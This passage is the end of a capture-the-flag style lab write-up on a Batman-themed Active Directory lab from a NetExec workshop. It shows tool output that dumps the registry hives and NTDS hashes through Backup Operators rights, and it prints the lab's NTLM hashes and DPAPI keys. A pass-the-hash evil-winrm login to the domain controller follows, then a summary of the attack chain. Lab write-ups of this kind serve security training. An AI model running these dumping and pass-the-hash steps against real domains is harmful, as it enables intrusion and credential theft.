BACKUP_O... 192.168.56.10   445    DC01             Saved HKLM\SAM to \\192.168.56.10\SYSVOL\SAM
BACKUP_O... 192.168.56.10   445    DC01             Saved HKLM\SYSTEM to \\192.168.56.10\SYSVOL\SYSTEM
BACKUP_O... 192.168.56.10   445    DC01             Saved HKLM\SECURITY to \\192.168.56.10\SYSVOL\SECURITY
SMB         192.168.56.10   445    DC01             [*] Copying "SAM" to "/root/.nxc/logs/DC01_192.168.56.10_2025-08-10_202807.SAM"
SMB         192.168.56.10   445    DC01             [+] File "SAM" was downloaded to "/root/.nxc/logs/DC01_192.168.56.10_2025-08-10_202807.SAM"
SMB         192.168.56.10   445    DC01             [*] Copying "SECURITY" to "/root/.nxc/logs/DC01_192.168.56.10_2025-08-10_202807.SECURITY"
SMB         192.168.56.10   445    DC01             [+] File "SECURITY" was downloaded to "/root/.nxc/logs/DC01_192.168.56.10_2025-08-10_202807.SECURITY"
SMB         192.168.56.10   445    DC01             [*] Copying "SYSTEM" to "/root/.nxc/logs/DC01_192.168.56.10_2025-08-10_202807.SYSTEM"
SMB         192.168.56.10   445    DC01             [+] File "SYSTEM" was downloaded to "/root/.nxc/logs/DC01_192.168.56.10_2025-08-10_202807.SYSTEM"
BACKUP_O... 192.168.56.10   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:52e6c515252f0487bdca397297ddec12:::
BACKUP_O... 192.168.56.10   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 192.168.56.10   445    DC01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 192.168.56.10   445    DC01             $MACHINE.ACC:plain_password_hex:b93d3b7d8a44309dc469a7146fa7fab024b82067039e0a04ae9c6f7c10ce47ff98bf6435fb4795df9f781ee88bbea6fc695c4644e69912d473fbc633b0517842327782741a42a8010ffae1200cf8cda180127332061ec87e9d998cea70b5e9ae03c0f3abb1db8532e41844dc68b5c7ad624b04cc8e547f1abd21de33345823367476b6dcced833ad46303babb59d98397f88c259157c8ca3790ae59e146611fcba65b1d61e3b3ee5ba11ec32d8c4cf5d87234de97b90936babab952efd11d55d707e0188973f5c0868ebdb74ff465e5f8b9fe8b34e1c93febcf397ad01a23ecaafa228826c073d528a3dff2ca8556933
BACKUP_O... 192.168.56.10   445    DC01             $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:64b200ea98cd1869ff5c26a4461fd0e8
BACKUP_O... 192.168.56.10   445    DC01             dpapi_machinekey:0x1308fb90bd98c002a0d6b204b98f18af100eba01
dpapi_userkey:0x022cbb36714f11623d776c37bfd8f7d474247230
BACKUP_O... 192.168.56.10   445    DC01             NL$KM:2080986a02b99c0c84a3e51e64e6d444cbfc0d8998d21bb4b1491d564156955d09b0b1feab7969940c2b8bc2285b702f69076402c7b45ece9e098bdb872f239d
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\Administrator:52e6c515252f0487bdca397297ddec12 (admin)
BACKUP_O... 192.168.56.10   445    DC01             [*] Dumping NTDS...
SMB         192.168.56.10   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.56.10   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:52e6c515252f0487bdca397297ddec12:::
SMB         192.168.56.10   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.10   445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5d6de4b880511e388a4cf54961dcb10f:::
SMB         192.168.56.10   445    DC01             vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.10   445    DC01             bruce.wayne:1106:aad3b435b51404eeaad3b435b51404ee:cc2aab3caf22348af7a9a897ca720b63:::
SMB         192.168.56.10   445    DC01             joker:1107:aad3b435b51404eeaad3b435b51404ee:27555671339d160619ac9c2b070c86f2:::
SMB         192.168.56.10   445    DC01             alfred.pennyworth:1108:aad3b435b51404eeaad3b435b51404ee:8ddf2dee102773ed238e4e823065e757:::
SMB         192.168.56.10   445    DC01             selina.kyle:1109:aad3b435b51404eeaad3b435b51404ee:4de27d42895d2ff9a3f03289fb5d10fb:::
SMB         192.168.56.10   445    DC01             harvey.dent:1110:aad3b435b51404eeaad3b435b51404ee:920ea45ca7439979801ceca12187e553:::
SMB         192.168.56.10   445    DC01             jim.gordon:1111:aad3b435b51404eeaad3b435b51404ee:7dbf00537b54dc6960d90ac1d54b5a2b:::
SMB         192.168.56.10   445    DC01             lucius.fox1337:1112:aad3b435b51404eeaad3b435b51404ee:acba2aaeb2574c5cf4eed6c7f27330de:::
SMB         192.168.56.10   445    DC01             barbara.gordon:1113:aad3b435b51404eeaad3b435b51404ee:afb78b94e7621248e13216313c2de54c:::
SMB         192.168.56.10   445    DC01             oswald.cobblepot:1114:aad3b435b51404eeaad3b435b51404ee:f59017f45ebe5e89dcdb84b7c9a08682:::
SMB         192.168.56.10   445    DC01             edward.nygma:1115:aad3b435b51404eeaad3b435b51404ee:69e51d41eff25ddaa22a890684c6f276:::
SMB         192.168.56.10   445    DC01             bane:1116:aad3b435b51404eeaad3b435b51404ee:04908f83f2681f128497150f3c746ecd:::
SMB         192.168.56.10   445    DC01             victor.freeze:1117:aad3b435b51404eeaad3b435b51404ee:6a152e350042706f24b8e1224c18f572:::
SMB         192.168.56.10   445    DC01             harley.quinn:1118:aad3b435b51404eeaad3b435b51404ee:f17fff84753682b1a3147da512354f3e:::
SMB         192.168.56.10   445    DC01             dick.grayson:1119:aad3b435b51404eeaad3b435b51404ee:ca7d1f94796c9c900a98c2c5f891dcbc:::
SMB         192.168.56.10   445    DC01             jason.todd:1120:aad3b435b51404eeaad3b435b51404ee:fe6ced7e22d98abbf9067df47a4c1686:::
SMB         192.168.56.10   445    DC01             tim.drake:1121:aad3b435b51404eeaad3b435b51404ee:42c8dfe4018844345a4f0d5d81085e08:::
SMB         192.168.56.10   445    DC01             talia.al.ghul:1122:aad3b435b51404eeaad3b435b51404ee:57ca45b2080254b7bfee0c2d8ab69b4b:::
SMB         192.168.56.10   445    DC01             rachel.dawes:1123:aad3b435b51404eeaad3b435b51404ee:37c93f5d6e7b44cd8b59de4c0410efab:::
SMB         192.168.56.10   445    DC01             ras.al.ghul:1124:aad3b435b51404eeaad3b435b51404ee:14dc16a2eac98b783f8b73e063323ea2:::
SMB         192.168.56.10   445    DC01             scarecrow:1125:aad3b435b51404eeaad3b435b51404ee:280bb0849e5fb0324d94554c528cc1eb:::
SMB         192.168.56.10   445    DC01             poison.ivy:1126:aad3b435b51404eeaad3b435b51404ee:11e8539cf8d3ae967228cf59538d6538:::
SMB         192.168.56.10   445    DC01             black.mask:1127:aad3b435b51404eeaad3b435b51404ee:e4ac0af806b13542f617151459c4736c:::
SMB         192.168.56.10   445    DC01             killer.croc:1128:aad3b435b51404eeaad3b435b51404ee:7ada0e427df96ef50055560dd1490dd4:::
SMB         192.168.56.10   445    DC01             deadshot:1129:aad3b435b51404eeaad3b435b51404ee:8f056bcc4f33d761e410ee5e9d430cae:::
SMB         192.168.56.10   445    DC01             DC01$:1001:aad3b435b51404eeaad3b435b51404ee:64b200ea98cd1869ff5c26a4461fd0e8:::
SMB         192.168.56.10   445    DC01             SRV02$:1104:aad3b435b51404eeaad3b435b51404ee:2122161db8d91e1b0275a0d636255bd7:::
SMB         192.168.56.10   445    DC01             SRV01$:1105:aad3b435b51404eeaad3b435b51404ee:a6af484f4f8d4e91a635cce086126a8a:::
SMB         192.168.56.10   445    DC01             gmsa-robin$:1130:aad3b435b51404eeaad3b435b51404ee:76679bd649f3801655ba01794de14e0b:::
SMB         192.168.56.10   445    DC01             [+] Dumped 32 NTDS hashes to /root/.nxc/logs/ntds/192.168.56.10_None_2025-08-10_202806.ntds of which 28 were added to the database
SMB         192.168.56.10   445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         192.168.56.10   445    DC01             [*] cat /root/.nxc/logs/ntds/192.168.56.10_None_2025-08-10_202806.ntds | grep -iv disabled | cut -d ':' -f1
SMB         192.168.56.10   445    DC01             [*] grep -iv disabled /root/.nxc/logs/ntds/192.168.56.10_None_2025-08-10_202806.ntds | cut -d ':' -f1
BACKUP_O... 192.168.56.10   445    DC01             [*] Cleaning dump with user Administrator and hash 52e6c515252f0487bdca397297ddec12 on domain GOTHAM.CITY
BACKUP_O... 192.168.56.10   445    DC01             [-] Fail to remove the file SAM, path: C:\Windows\sysvol\sysvol\SAM
BACKUP_O... 192.168.56.10   445    DC01             [-] Fail to remove the file SECURITY, path: C:\Windows\sysvol\sysvol\SECURITY
BACKUP_O... 192.168.56.10   445    DC01             [-] Fail to remove the file SYSTEM, path: C:\Windows\sysvol\sysvol\SYSTEM
BACKUP_O... 192.168.56.10   445    DC01             [*] Use the domain admin account to clean the file on the remote host
BACKUP_O... 192.168.56.10   445    DC01             [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM"
```

**What happens:**
- RemoteRegistry service is triggered to start
- SAM, SYSTEM, and SECURITY hives are saved to SYSVOL
- NTDS database dump begins

We now have the hash for the domain administrator account! This is the golden ticket.

### Administrative Access to Domain Controller

With the administrator hash, connecting directly to the domain controller.

**Command used:**
```bash
evil-winrm -u Administrator -H 52e6c515252f0487bdca397297ddec12 -i 192.168.56.10
```

**Connection successful!**
```shell
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
gotham\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01
```

**DOMAIN DOMINATION ACHIEVED!** 🎉

---

## Conclusion

### Attack Summary

1. **Reconnaissance:** Discovered network topology and enumerated users
2. **SRV01:** Exploited via DLL hijacking and privilege escalation
3. **SRV02:** Pivoted via PrintNightmare and credential recovery
4. **DC01:** Final domination via Backup Operators rights exploitation

### Techniques Used

- **AS-REP Roasting** on lucius.fox1337
- **Kerberoasting** to obtain joker's hash
- **DLL Hijacking** on the Wayne service
- **PrintNightmare** (CVE-2021-34527)
- **Abuse of Backup Operators rights**
- **NTDS dump** for domain hash recovery

### Key Learning Points

- **Persistence:** Creating local administrator accounts for persistence
- **Lateral Movement:** Pivoting between servers using various techniques
- **Privilege Escalation:** Progressive elevation of privileges
- **Domain Dominance:** Achieving administrative access to the domain controller

### Final Thoughts

This lab was an excellent demonstration of obscure Active Directory attack chains, many of which were new discoveries. The progression from initial reconnaissance to domain domination shows how attackers can chain multiple techniques together to achieve their objectives.

The use of GMSA accounts, backup operator rights, and various privilege escalation techniques mirrors what we see in actual penetration tests and red team engagements.

**Thanks to all the BarbHack Netexec Workshop 2024 organizers and the Netexec team for this exceptional lab!**

---

*Writeup written w/love by Elliot Belt <3*
